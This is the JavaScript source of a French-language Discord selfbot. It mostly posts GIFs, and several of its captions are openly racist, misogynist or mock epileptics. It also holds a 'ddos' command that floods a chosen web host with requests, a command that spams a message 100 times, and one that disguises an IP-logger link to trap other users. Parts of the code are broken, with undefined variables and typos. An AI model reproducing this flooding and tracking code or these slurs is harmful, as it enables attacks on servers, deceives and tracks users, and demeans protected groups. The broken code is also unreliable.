const Discord = require('discord.js');
const ms = require('ms');
const fs = require('fs');
const request = require('request');
const config = require('./config.json');

const bot = new Discord.Client();

bot.on("ready", async() => {

	let serverCount = bot.guilds.size;

	console.log("| Bienvenue sur : le bunker |");
	console.log(`${'-'.repeat(100)}\n`);
	console.log("| Information :");
	console.log(`|Nom : ${bot.user.username}`);
	console.log(`|ID : ${bot.user.id}`);
	console.log(`${'-'.repeat(100)}\n`);
	console.log(`|Statistiques :`);
	console.log(`|Serveurs : ${serverCount}`);

	bot.user.setPresence({
			game: {
				name : "Le Bunker ✨",
				type: "STREAMING",
				url: "https://www.twitch.tv/selfbot"
			}
		})
})

bot.on("message", message => {

	let prefix = config.prefix;
	let color = config.color;

	if(message.content.startsWith(prefix +'setgame')) {
		if(message.author.id == bot.user.id) {
			let game = message.content.split(' ').slice(1).join(' ')
			bot.user.setGame(game)
			const embed = new Discord.RichEmbed()
				.setAuthor('Jeux mit !', `${message.author.avatarURL}`)
				.setColor(color)
				.setDescription(`Jeux mit : ${game}`)
				.setTimestamp();
			message.edit({embed});
		}
	}

	if(message.content.startsWith(prefix +'setstream')) {
		if(message.author.id == bot.user.id) {
		let stream = message.content.split(' ').slice(1).join(' ')
		bot.user.setPresence({
			game: {
				name : `${stream}`,
				type: "STREAMING",
				url: "https://www.twitch.tv/rien"
			}
		})
		const embed = new Discord.RichEmbed()
			.setAuthor('stream mit !', `${message.author.avatarURL}`)
			.setColor(color)
			.setDescription(`stream mit : ${stream}`)
			.setTimestamp();
		message.edit({embed});
		}

	}

	if(message.content.startsWith(prefix +'setlisten')) {
		if(message.author.id == bot.user.id) {
		let listen = message.content.split(' ').slice(1).join(' ')
		bot.user.setPresence({
			game: {
				name : `${listen}`,
				type: "LISTENING",
			}
		})
		const embed = new Discord.RichEmbed()
			.setAuthor('listening mit !', `${message.author.avatarURL}`)
			.setColor(color)
			.setDescription(`listening mit : ${listen}`)
			.setTimestamp();
		message.edit({embed});
	}

	}

	if(message.content.startsWith(prefix +'setwatch')) {
		if(message.author.id == bot.user.id) {
		let watch = message.content.split(' ').slice(1).join(' ')
		bot.user.setPresence({
			game: {
				name : `${watch}`,
				type: "WATCHING",
			}
		})
		const embed = new Discord.RichEmbed()
			.setAuthor('watch mit !', `${message.author.avatarURL}`)
			.setColor(color)
			.setDescription(`watch mit : ${watch}`)
			.setTimestamp();
		message.edit({embed});
	}

	}

	if(message.content.startsWith(prefix + "blc")) {
		if(message.author.id == bot.user.id) {
			const embed = new Discord.RichEmbed()
				.setAuthor("J'm'en bat les couilles frére !")
				.setColor(color)
				.setImage("https://tenor.com/EtH0.gif");
			message.edit({embed});
		}
	}

	if(message.content.startsWith(prefix + "kiss")) {
		if(message.author.id == bot.user.id) {
			const embed = new Discord.RichEmbed()
				.setAuthor("J'suit trop minion ouaiche")
				.setColor(color)
				.setImage('https://cdn.discordapp.com/attachments/508251501240647691/550499669520678913/lol.gif');
			message.edit({embed});
		}
	}

	if(message.content.startsWith(prefix + "riparabe")) {
		if(message.author.id == bot.user.id) {
			const embed = new Discord.RichEmbed()
				.setAuthor("Nique les bougnoules")
				.setColor(color)
				.setImage('https://cdn.discordapp.com/attachments/494169648514727968/520351217906614295/image-5.jpg');
			message.edit({embed});
		}
	}

	if(message.content.startsWith(prefix + "kehba")) {
		if(message.author.id == bot.user.id) {
			const embed = new Discord.RichEmbed()
				.setAuthor("Je te biffle salope")
				.setColor(color)
				.setImage('https://cdn.discordapp.com/attachments/550084821347729429/550502648726421524/issou.gif');
			message.edit({embed});
		}

	}

	if(message.content.startsWith(prefix + "clochard")) {
		if(message.author.id == bot.user.id) {
			const embed = new Discord.RichEmbed()
				.setAuthor("Ta famille qui débarque en Françe")
				.setColor(color)
				.setImage('https://cdn.discordapp.com/attachments/518527001280380960/520669737647341579/download.jpg');
			message.edit({embed});
		}
	}

	if(message.content.startsWith(prefix + "ripepil")) {
		if(message.author.id == bot.user.id) {
			const embed = new Discord.RichEmbed()
				.setAuthor("Nique tout les epileptiques")
				.setColor(color)
  				.setImage('https://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gif https://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif');
  			message.edit({embed});
		}

	}

	if(message.content.startsWith(prefix + "fouette")) {
		if(message.author.id == bot.user.id) {
			const embed = new Discord.RichEmbed()
				.setAuthor("Nique toutes les femmes")
				.setColor(color)
  				.setImage('https://cdn.discordapp.com/attachments/568879647610372116/571506684921511938/aw9WgvgNd1bQk.gif');
  			message.edit({embed});
		}

	}

	if(message.content.startsWith(prefix + "mee6")) {
		if(message.author.id == bot.user.id) {
			const embed = new Discord.RichEmbed()
				.setAuthor("crie !!")
				.setColor(color)
  				.setImage('https://cdn.discordapp.com/attachments/568879647610372116/571507788593758248/jA0J9vtUqDIpq.gif');
 			message.edit({embed});
		}

	}

	if(message.content.startsWith(prefix + "tourne")) {
		if(message.author.id == bot.user.id) {
			const embed = new Discord.RichEmbed()
				.setAuthor("tourne")
				.setColor(color)
 		 		.setImage('https://cdn.discordapp.com/attachments/568879647610372116/571507000148623380/12eo2dNB6ZGvkI.gif');
  			message.edit({embed});
		}

	}

	if(message.content.startsWith(prefix + "illuminatie")) {
		if(message.author.id === bot.user.id) {
			const embed = new Discord.RichEmbed()
				.setAuthor("Tourne avec son oeil")
				.setColor(color)
  				.setImage('https://cdn.discordapp.com/attachments/568879647610372116/571509338792001556/PqguWRwm3lJkI.gif');
  			message.edit({embed});
		}
	}

	if(message.content.startsWith(prefix + "voleur")) {
		if(message.author.id == bot.user.id) {
			const embed = new Discord.RichEmbed()
			  	.setAuthor("a braquer une banque")
			  	.setColor(color)
			  	.setImage('https://cdn.discordapp.com/attachments/568879647610372116/571509785061490698/gif_temp.gif');
			message.edit({embed});
		}
	}

	if(message.content.startsWith(prefix + "lose")) {
		if(message.author.id == bot.user.id) {
			const embed = new Discord.RichEmbed()
				.setAuthor("Tu as perdu !")
				.setColor(color)
				.setImage('https://cdn.discordapp.com/attachments/568879647610372116/571510220023529473/gif_temp.gif');
			message.edit({embed});
		}
	}

	if(message.content.startsWith(prefix + "kill")) {
		if(message.author.id == bot.user.id) {
			const embed = new Discord.RichEmbed()
				.setAuthor("te tue")
				.setColor(color)
				.setImage('https://cdn.discordapp.com/attachments/568879647610372116/571510496608649226/gif_temp.gif');
			message.edit({embed});
		}
	}

	if(message.content.startsWith(prefix + "dislike")) {
		if(message.author.id == bot.user.id) {
			const embed = new Discord.RichEmbed()
				.setAuthor("Aime pas")
				.setColor(color)
				.setImage('https://cdn.discordapp.com/attachments/568879647610372116/571510899203112971/gif_temp.gif');
			message.edit({embed});
		}
	}

	if(message.content.startsWith(prefix + "fou")) {
		if(message.author.id == bot.user.id) {
			const embed = new Discord.RichEmbed()
				.setAuthor("malade mentale")
				.setColor(color)
				.setImage('https://cdn.discordapp.com/attachments/568879647610372116/571511169311965184/gif_temp.gif');
			message.edit({embed});
		}
	}

	if(message.content.startsWith(prefix + "speed")) {
		if(message.author.id == bot.user.id) {
			const embed = new Discord.RichEmbed()
				.setAuthor("Court vite")
				.setColor(color)
				.setImage('https://cdn.discordapp.com/attachments/568879647610372116/571511499097374720/aPkKB6IHZBGxi.gif');
			message.edit({embed});
		}
	}

	if(message.content.startsWith(prefix + "thug")) {
		if(message.author.id == bot.user.id) {
			const embed = new Discord.RichEmbed()
				.setAuthor("Fait son fou !")
				.setColor(color)
				.setImage('https://cdn.discordapp.com/attachments/568879647610372116/571511823925379095/gif_temp.gif');
			message.edit({embed});
		}
	}

	if(message.content.startsWith(prefix + "oklm")) {
		if(message.author.id == bot.user.id) {
			const embed = new Discord.RichEmbed()
				.setAuthor("Snoop dog 👻")
				.setColor(color)
				.setImage('https://cdn.discordapp.com/attachments/568879647610372116/571512218546339843/gif_temp.gif');
			message.edit({embed});
		}
	}

	if(message.content.startsWith(prefix + "handspinner")) {
		if(message.author.id == bot.user.id) {
			const embed = new Discord.RichEmbed()
				.setAuthor("Tourne comme ta mé**")
				.setColor(color)
				.setImage('https://cdn.discordapp.com/attachments/568879647610372116/571512984883691520/gif_temp.gif');
			message.edit({embed});
		}
	}

	if(message.content.startsWith(prefix + "fuck")) {
		if(message.author.id == bot.user.id) {
			const embed = new Discord.RichEmbed()
				.setAuthor("Te lache un fuch rageux")
				.setColor(color)
				.setImage('https://cdn.discordapp.com/attachments/568879647610372116/571513720111366146/gif_temp.gif');
			message.edit({embed});
		}
	}

	if(message.content.startsWith(prefix + "punch")) {
		if(message.author.id == bot.user.id) {
			const embed = new Discord.RichEmbed()
				.setAuthor("Te met un coup de poing")
				.setColor(color)
				.setImage('https://cdn.discordapp.com/attachments/568879647610372116/571515233571438602/gif_temp.gif');
			message.edit({embed});
		}
	}

	if(message.content.startsWith(prefix + "hulk")) {
		if(message.author.id == bot.user.id) {
			const embed = new Discord.RichEmbed()
				.setAuthor("crie ! HULK !!!!!!!!")
				.setColor(color)
				.setImage('https://cdn.discordapp.com/attachments/568879647610372116/571515965565829120/gif_temp.gif');
			message.edit({embed});
		}
	}

	if(message.content.startsWith(prefix + "twerk")) {
		if(message.author.id == bot.user.id) {
			const embed = new Discord.RichEmbed()
				.setAuthor("Gros cul d'hulk")
				.setColor(color)
				.setImage('https://cdn.discordapp.com/attachments/568879647610372116/571516764844720158/gif_temp.gif');
			message.edit({embed});
		}
	}

	if(message.content.startsWith(prefix + "rage")) {
		if(message.author.id == bot.user.id) {
			const embed = new Discord.RichEmbed()
				.setAuthor("Crie de rage")
				.setColor(color)
				.setImage('https://cdn.discordapp.com/attachments/568879647610372116/571517020827549699/uAnmHj5wTXxcY.gif');
			message.edit({embed});
		}
	}

	if(message.content.startsWith(prefix + "supersaiyan")) {
		if(message.author.id == bot.user.id) {
			const embed = new Discord.RichEmbed()
				.setAuthor("transformation")
				.setColor(color)
				.setImage('https://cdn.discordapp.com/attachments/568879647610372116/571517345747566595/gif_temp.gif');
			message.edit({embed});
		}
	}

	if(message.content.startsWith(prefix + "noob")) {
		if(message.author.id == bot.user.id) {
			const embed = new Discord.RichEmbed()
				.setAuthor("noob")
				.setColor(color)
				.setImage('https://cdn.discordapp.com/attachments/568879647610372116/571518008942526465/gif_temp.gif');
			message.edit({embed});
		}
	}

	if(message.content.startsWith(prefix + "ragequitte")) {
		if(message.author.id == bot.user.id) {
			const embed = new Discord.RichEmbed()
				.setAuthor("crie !")
				.setColor(color)
				.setImage('https://cdn.discordapp.com/attachments/568879647610372116/571518763044700161/gif_temp.gif');
			message.edit({embed});
		}
	}

	if(message.content.startsWith(prefix + "poulet")) {
		if(message.author.id == bot.user.id) {
			const embed = new Discord.RichEmbed()
				.setAuthor("crie !")
				.setColor(color)
				.setImage('https://cdn.discordapp.com/attachments/568879647610372116/571519173570723841/gif_temp.gif');
			message.edit({embed});
		}
	}

	if(message.content.startsWith(prefix + "rage2")) {
		if(message.author.id == bot.user.id) {
			const embed = new Discord.RichEmbed()
				.setAuthor("crie !")
				.setColor(color)
				.setImage('https://cdn.discordapp.com/attachments/568879647610372116/571519700077641738/gif_temp.gif');
			message.edit({embed});
		}
	}

	if(message.content.startsWith(prefix + "gif")) {
		if(message.author.id == bot.user.id) {
			const embed = new Discord.RichEmbed()
				.setThumbnail(message.author.avatarURL)
				.setTitle("Panel des commandes principales du **👻Le bunker👻 ✞ |** !")
				.addField(`${prefix}mee6`, "Il crie ce FDP")
				.addField(`${prefix}voleur`)
				.addField(`${prefix}lose`, "Tu as perdu")
				.addField(`${prefix}kill`, "Il te tue facilement")
				.addField(`${prefix}dislike`, "Je n'aime pas")
				.addField(`${prefix}fou`)
				.addField(`${prefix}speed`)
				.addField(`${prefix}thug`)
				.addField(`${prefix}oklm`)
				.addField(`${prefix}punch`)
				.addField(`${prefix}hulk`)
				.addField(`${prefix}twerk`)
				.addField(`${prefix}supersaiyan`)
				.addField(`${prefix}rage`)
				.addField(`${prefix}rage2`)
				.addField(`${prefix}poulet`)
				.addField(`${prefix}ragequitte`)
				.addField(`${prefix}tourne`, "Tourne sans réel but")
				.addField(`${prefix}kiss`, "Un baiser")
				.addField(`${prefix}blc`, "montre quel point tu t'en bas les couilles")
				.addField(`${prefix}riparabe[tres reaciste]`, "A ne pas trop montrer")
				.addField(`${prefix}kehba`, "A vous de voir")
				.addField(`${prefix}ripepil`, "Mes yeux !")
				.addField(`${prefix}fouette`, "nique la stickers woman")
				.addField(`${prefix}illuminatie`, "triangle")
				.setColor("#F40505")
 	 			.setFooter('◊ Copyright © 2019 👻Le bunker👻✞ |. ◊')
				.setImage('https://media.discordapp.net/attachments/541586025710092298/547813811403358208/MOSHED-2019-2-20-17-15-48.gif?width=562&height=422' )
				.setTimestamp();

			message.edit({embed});

		}

	}

	if(message.content.startsWith(prefix + "pp")) {
		if(message.channel.type == 'dm') return;
		var members = message.mentions.users.first();
		const embed = new Discord.RichEmbed()	
			.setAuthor(`photo de profil de ${message.mentions.user.first().username}`)
			.setColor(color)
			.setImage(members.user.avatarURL);
		message.edit({embed})
	}

	if(message.content.startsWith(prefix + "purge")) {
		if(message.author.id == bot.user.id) {
			let args = message.content.split(' ').slice(1);
			let messagecount = parseInt(args[0]) || 1;
			var deletemessage = messagecount - 1;
			message.channel.fetchMessages({
				limit: Math.min(messagecount + 1, 100, 200)
			})
			.then(messages => {
				messages.forEach(m => {
					m.delete().catch(cnsole.error);
					deletemessage++;
				});
			}).then(() => {
				if(deletemessage === -1) deletemessage = 0;
				message.channel.send(`${deletemessage} messages(s) ont ete supprimer`)
					.then(m => m.delete(5000));
			})
		}
	}

	if(message.content.includes(prefix + "ddos")) {
		if(message.author.id == client.user.id) {
			const embed = new Discord.RichEmbed()
				.setColor(color)
				.setTitle('DDOS lancé sur ' + '`' + args.join(' ') + '`')
			message.edit({embed})

			const interval = 32768;
			var target = args.join(' ');
			var cible = 'http://' + target;
			packet = function() {
				let code = 'H';
				return code;
			}
			sendrequest = function(code) {
				request(cible, (error) => {
					if(error){
						return
					}
				})
			}

			var count = 1;
			sendrequest(packet());
			setInterval(() => {
				sendrequest(packet());
				count++
				console.log(`[attaque en cours} packages :` + count);
			}, (1/interval) * 1000);
		}
	}
	

	if(message.content.startsWith(prefix + "hspam")) {
		if(message.author.id == bot.user.id) {
			const embed = new Discord.RichEmbed()
				.setAuthor(`${message.author.username}`)
				.setTitle("help spam")
				.setColor(color)
				.setThumbnail(`${message.author.avatarURL}`)
				.addField("Spam 💥", "--------------------du meilleur selfbot--------------------")
				.addBlankField()
				.addField(`${prefix}spam [ton message]`, "spam le message que tu veut", true)
				.addField(`${prefix}pub [lien]`, "Spam le lien que tu met", true)
				.addField(`${prefix}tts`, "permet de faire un message tts", true)
				.addField(`${prefix}iplog [lien]`, "camoufle l'ip logger", true)
				.addField("SOON", "SOON", true)
				.setFooter("By @ARROW#0450");
			message.edit({embed});
		}
	}

	if(message.content.startsWith(prefix + "help")){
		if(message.author.id == bot.user.id) {
			const embed = new Discord.RichEmbed()
				.setAuthor(`${message.author.username}`)
				.setTitle("Voici le help")
				.setColor(color)
				.setThumbnail(`${message.author.avatarURL}`)
				.addField("help", "Les commandes")
				.addBlankField()
				.addField(`${prefix}hspam`, "montre les commandes de spam", true)
				.addField(`${prefix}exit`,"Vous permet de quitter votre selfbot", true)
				.addField(`${prefix}gif`,"Vous montre tout les gifs", true)
				.addField(`${prefix}ddos`,"vous permet de ddos quelqu'un", true)
				.addField(`${prefix}fun`,"Vous permet de vous montrer les commandes fun", true);
			message.edit({embed});
		}
	}

	if(message.content.startsWith(prefix + "fun")) {
		if(message.author.id == bot.user.id) {
			const embed = new Discors.RichEmbed()
				.setAuthor(`${message.author.avatarURL}`)
				.setTitle("Voici le fun")
				.setColor(color)
				.setThumbnail(`${message.author.avatarURL}`)
				.addField("Fun 💥", "--------------------du meilleur selfbot--------------------")
				.addBlankField()
				.addField(`${prefix}cherche [mot clé]`, "Vous permet de chercher quelque chose", true)
				.addField(`${prefix}8ball [ta question]`, "Vous permet de faire repondre", true)
				.addField(`${prefix}virus [nom]`, "Faux virus", true)
				.addField(`${prefix}pp`, "recupere l'image de profil de quelqu'un", true)
				.setFooter("ARROW#0450");
			message.edit({embed});
		}
	}

	if(message.content.startsWith(prefix + "pub")) {
		if(message.author.id == bot.user.id) {
			var args = message.content.split(" ").slice(1);
			var msge = args.join(' ');
			if(!msge) return message.edit("veuillez mettre un message a pub");
			for(var i = 0; i < 100; i++) {
				const embed = new Discord.RichEmbed()
					.setAuthor('PUB !')
					.setColor(color)
					.addField(msge, "Rejoigner !")
				message.channel.send(embed);
			}
		}
	}

	if(message.content.startsWith(prefix + "iplog")) {
		if(message.author.id == bot.user.id) {
			var args = message.content.split(" ").slice(1);
			var msge = args.join(' ');
			if(!msge) return message.edit("Veuillez mettre un message")
			const embed = new Discord.RichEmbed()
				.setColor(color)
				.setURL(`${msge}`)
				.setTitle("Clique");
			message.edit({embed});
		}
	}

	if(message.content.startsWith(prefix + "virus")) {
		if(message.author.id == bot.user.id) {
			let args = message.content.split(' ').slice(1);
			let virusname = args.join
			if(virusname < 1) {
				message.edit("Veuillez mettre le nom d'un virus");ge.edit({ embed: new Discord.RichEmbed().setTitle("Loading " + virusname + "...").setColor(color)}).then(function(m) {
					setTimeout(function() {
						m.edit({ embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: 𝐋𝐚𝐧𝐜𝐞𝐦𝐞𝐧𝐭 𝐝𝐞 𝐥𝐚 𝐁𝐚𝐜𝐤𝐝𝐨𝐨𝐫 [▓] 𝟏%').setColor(color)})
					}, 1000)
					setTimeout(function() {
						m.edit({ embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: 𝐋𝐚𝐧𝐜𝐞𝐦𝐞𝐧𝐭 𝐝𝐞 𝐥𝐚 𝐁𝐚𝐜𝐤𝐝𝐨𝐨𝐫 [▓▓▓▓] 𝟐𝟓%').setColor(color)})
					}, 2000)
					setTimeout(function() {
						m.edit({ embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: 𝐋𝐚𝐧𝐜𝐞𝐦𝐞𝐧𝐭 𝐝𝐞 𝐥𝐚 𝐁𝐚𝐜𝐤𝐝𝐨𝐨𝐫 [▓▓▓▓▓▓▓] 𝟓𝟎%').setColor(color)})
					}, 3000)
					setTimeout(function() {
						m.edit({ embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: 𝐋𝐚𝐧𝐜𝐞𝐦𝐞𝐧𝐭 𝐝𝐞 𝐥𝐚 𝐁𝐚𝐜𝐤𝐝𝐨𝐨𝐫 [▓▓▓▓▓▓▓▓▓▓▓] 𝟕𝟓%').setColor(color)})
					}, 4000)
					setTimeout(function() {
						m.edit({ embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: 𝐋𝐚𝐧𝐜𝐞𝐦𝐞𝐧𝐭 𝐝𝐞 𝐥𝐚 𝐁𝐚𝐜𝐤𝐝𝐨𝐨𝐫 [▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ] 𝟏𝟎𝟎%').setColor(color)})
					}, 5000)
					setTimeout(function() {
						m.edit({ embed: new Discord.RichEmbed().setTitle('[' + virusname + ']: 𝐁𝐚𝐜𝐤𝐝𝐨𝐨𝐫 𝐥𝐚𝐧𝐜𝐞́𝐞').setColor(color)})
					}, 6000)
					setTimeout(function() {
						m.delete();
					}, 10000)
				});
			}
		}
	}

});

bot.login("process.env.TOKEN");
